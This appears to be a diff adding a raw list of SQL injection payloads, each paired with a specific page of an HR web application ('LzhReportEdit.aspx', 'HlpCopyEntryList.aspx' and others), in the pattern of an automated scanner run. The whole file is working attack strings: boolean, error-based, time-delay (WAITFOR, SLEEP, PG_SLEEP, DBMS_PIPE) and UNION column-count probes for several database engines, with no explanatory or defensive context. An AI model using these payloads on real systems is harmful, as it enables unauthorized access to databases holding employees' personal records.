@@ -1,0 +1,1027 @@
+/HR3/Common/ErrorPage/SystemSettingInfo.aspx	__EVENTTARGET=BtnOk&EmpID=766360' and len(DB_name())=2 and '1'='1
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=1''
+/hr3/personnel/lzh/lzhdisciplineedit.aspx   recid=1' and '1'='1
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101532'
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533]'[[''"'(]
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533; WAITFOR DELAY '0:0:5'--
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 WAITFOR DELAY '0:0:5'--
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533.')"(][][.
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533') AND 1151=1999 AND ('netD'='netD
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533') AND 5156=5156 AND ('JDfx'='JDfx
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533') AND 1420=1394 AND ('KPMv'='KPMv
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533' AND 3402=6132 AND 'SHVD'='SHVD
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533' AND 5156=5156 AND 'GHWw'='GHWw
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533' AND 5202=8783 AND 'vEiA'='vEiA
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533%' AND 6112=1416 AND '%'='
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533%' AND 5156=5156 AND '%'='
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533%' AND 6390=8208 AND '%'='
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533') AND (SELECT 8692 FROM(SELECT COUNT(*),CONCAT(0x3a7963643a,(SELECT (CASE WHEN (8692=8692) THEN 1 ELSE 0 END)),0x3a786d793a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('qoyj'='qoyj
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533' AND (SELECT 8692 FROM(SELECT COUNT(*),CONCAT(0x3a7963643a,(SELECT (CASE WHEN (8692=8692) THEN 1 ELSE 0 END)),0x3a786d793a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'YCdI'='YCdI
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533%' AND (SELECT 8692 FROM(SELECT COUNT(*),CONCAT(0x3a7963643a,(SELECT (CASE WHEN (8692=8692) THEN 1 ELSE 0 END)),0x3a786d793a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533') AND 8173=CAST((CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (8173=8173) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)) AS NUMERIC) AND ('Szit'='Szit
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533' AND 8173=CAST((CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (8173=8173) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)) AS NUMERIC) AND 'Dnmi'='Dnmi
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533%' AND 8173=CAST((CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (8173=8173) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)) AS NUMERIC) AND '%'='
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533') AND 9038=CONVERT(INT,(CHAR(58)+CHAR(121)+CHAR(99)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (9038=9038) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(120)+CHAR(109)+CHAR(121)+CHAR(58))) AND ('QtUf'='QtUf
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533' AND 9038=CONVERT(INT,(CHAR(58)+CHAR(121)+CHAR(99)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (9038=9038) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(120)+CHAR(109)+CHAR(121)+CHAR(58))) AND 'Tvgv'='Tvgv
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533%' AND 9038=CONVERT(INT,(CHAR(58)+CHAR(121)+CHAR(99)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (9038=9038) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(120)+CHAR(109)+CHAR(121)+CHAR(58))) AND '%'='
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533') AND 1762=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58)||(SELECT (CASE WHEN (1762=1762) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)||CHR(62))) FROM DUAL) AND ('bonR'='bonR
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533' AND 1762=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58)||(SELECT (CASE WHEN (1762=1762) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)||CHR(62))) FROM DUAL) AND 'Rqkx'='Rqkx
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533%' AND 1762=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58)||(SELECT (CASE WHEN (1762=1762) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)||CHR(62))) FROM DUAL) AND '%'='
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533'); SELECT SLEEP(5)-- 
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533'; SELECT SLEEP(5)-- 
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533%'; SELECT SLEEP(5)-- 
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533'); SELECT PG_SLEEP(5)--
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533'; SELECT PG_SLEEP(5)--
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533%'; SELECT PG_SLEEP(5)--
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533); WAITFOR DELAY '0:0:5'--
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533; WAITFOR DELAY '0:0:5'--
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 WAITFOR DELAY '0:0:5'--
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 IF((80+92)=172) WAITFOR DELAY '0:0:5'--
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 IF(80>(33+92)) WAITFOR DELAY '0:0:5'--
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 IF((33+80)>205) WAITFOR DELAY '0:0:5'--
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 IF(172=(80+92)) WAITFOR DELAY '0:0:5'--
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 IF(1879                                                                                                                                                                                                                                                                =                                                                                                                                                                                                                                                                1879) WAITFOR DELAY '0:0:5'--
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 IF(BINARY_CHECKSUM(7996)=BINARY_CHECKSUM(7996)) WAITFOR DELAY '0:0:5'--
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 IF(HOST_NAME()=HOST_NAME()) WAITFOR DELAY '0:0:5'--
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 IF(XACT_STATE()=XACT_STATE()) WAITFOR DELAY '0:0:5'--
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 IF(SYSDATETIME()=SYSDATETIME()) WAITFOR DELAY '0:0:5'--
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate'
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' and '1'='1
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate)"("",.,"'
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 6435=8362 AND ('ocNU'='ocNU
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 4954=4954 AND ('oBee'='oBee
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 3150=5389 AND 'MdTv'='MdTv
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 4954=4954 AND 'Vdhd'='Vdhd
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 4603=7748 AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 4954=4954 AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND (SELECT 2742 FROM(SELECT COUNT(*),CONCAT(0x3a6f68663a,(SELECT (CASE WHEN (2742=2742) THEN 1 ELSE 0 END)),0x3a6a756f3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('Zjnb'='Zjnb
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND (SELECT 2742 FROM(SELECT COUNT(*),CONCAT(0x3a6f68663a,(SELECT (CASE WHEN (2742=2742) THEN 1 ELSE 0 END)),0x3a6a756f3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'nsBQ'='nsBQ
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND (SELECT 2742 FROM(SELECT COUNT(*),CONCAT(0x3a6f68663a,(SELECT (CASE WHEN (2742=2742) THEN 1 ELSE 0 END)),0x3a6a756f3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 7002=CAST((CHR(58)||CHR(111)||CHR(104)||CHR(102)||CHR(58))||(SELECT (CASE WHEN (7002=7002) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(106)||CHR(117)||CHR(111)||CHR(58)) AS NUMERIC) AND ('SgYk'='SgYk
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 7002=CAST((CHR(58)||CHR(111)||CHR(104)||CHR(102)||CHR(58))||(SELECT (CASE WHEN (7002=7002) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(106)||CHR(117)||CHR(111)||CHR(58)) AS NUMERIC) AND 'haGp'='haGp
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 7002=CAST((CHR(58)||CHR(111)||CHR(104)||CHR(102)||CHR(58))||(SELECT (CASE WHEN (7002=7002) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(106)||CHR(117)||CHR(111)||CHR(58)) AS NUMERIC) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 1291=CONVERT(INT,(CHAR(58)+CHAR(111)+CHAR(104)+CHAR(102)+CHAR(58)+(SELECT (CASE WHEN (1291=1291) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(117)+CHAR(111)+CHAR(58))) AND ('qsQd'='qsQd
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 1291=CONVERT(INT,(CHAR(58)+CHAR(111)+CHAR(104)+CHAR(102)+CHAR(58)+(SELECT (CASE WHEN (1291=1291) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(117)+CHAR(111)+CHAR(58))) AND 'bTdt'='bTdt
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 1291=CONVERT(INT,(CHAR(58)+CHAR(111)+CHAR(104)+CHAR(102)+CHAR(58)+(SELECT (CASE WHEN (1291=1291) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(117)+CHAR(111)+CHAR(58))) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 1656=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(111)||CHR(104)||CHR(102)||CHR(58)||(SELECT (CASE WHEN (1656=1656) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(106)||CHR(117)||CHR(111)||CHR(58)||CHR(62))) FROM DUAL) AND ('TiNq'='TiNq
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 1656=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(111)||CHR(104)||CHR(102)||CHR(58)||(SELECT (CASE WHEN (1656=1656) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(106)||CHR(117)||CHR(111)||CHR(58)||CHR(62))) FROM DUAL) AND 'PEJp'='PEJp
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 1656=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(111)||CHR(104)||CHR(102)||CHR(58)||(SELECT (CASE WHEN (1656=1656) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(106)||CHR(117)||CHR(111)||CHR(58)||CHR(62))) FROM DUAL) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate'); SELECT SLEEP(5)-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate'; SELECT SLEEP(5)-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%'; SELECT SLEEP(5)-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate'); SELECT PG_SLEEP(5)--
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate'; SELECT PG_SLEEP(5)--
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%'; SELECT PG_SLEEP(5)--
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate); WAITFOR DELAY '0:0:5'--
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate; WAITFOR DELAY '0:0:5'--
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate'); WAITFOR DELAY '0:0:5'--
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate'; WAITFOR DELAY '0:0:5'--
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%'; WAITFOR DELAY '0:0:5'--
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND SLEEP(5) AND ('ennW'='ennW
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND SLEEP(5) AND 'PXXn'='PXXn
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND SLEEP(5) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 5021=(SELECT 5021 FROM PG_SLEEP(5)) AND ('EcCM'='EcCM
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 5021=(SELECT 5021 FROM PG_SLEEP(5)) AND 'Dotv'='Dotv
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 5021=(SELECT 5021 FROM PG_SLEEP(5)) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) WAITFOR DELAY '0:0:5'--
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate WAITFOR DELAY '0:0:5'--
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') WAITFOR DELAY '0:0:5'--
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' WAITFOR DELAY '0:0:5'--
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' WAITFOR DELAY '0:0:5'--
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 2636=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(112)||CHR(119)||CHR(100),5) AND ('FmZH'='FmZH
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 2636=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(112)||CHR(119)||CHR(100),5) AND 'Sxif'='Sxif
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 2636=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(112)||CHR(119)||CHR(100),5) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') ORDER BY 1#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') ORDER BY 1058#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') LIMIT 0,1 UNION ALL SELECT NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') LIMIT 0,1 UNION ALL SELECT NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' ORDER BY 1#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' ORDER BY 4715#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' LIMIT 0,1 UNION ALL SELECT NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' LIMIT 0,1 UNION ALL SELECT NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' ORDER BY 1#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' ORDER BY 1529#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' LIMIT 0,1 UNION ALL SELECT NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' LIMIT 0,1 UNION ALL SELECT NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') ORDER BY 1-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') ORDER BY 3961-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') UNION ALL SELECT NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') UNION ALL SELECT NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') UNION ALL SELECT NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') UNION ALL SELECT NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' ORDER BY 1-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' ORDER BY 5657-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' ORDER BY 1-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' ORDER BY 2405-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
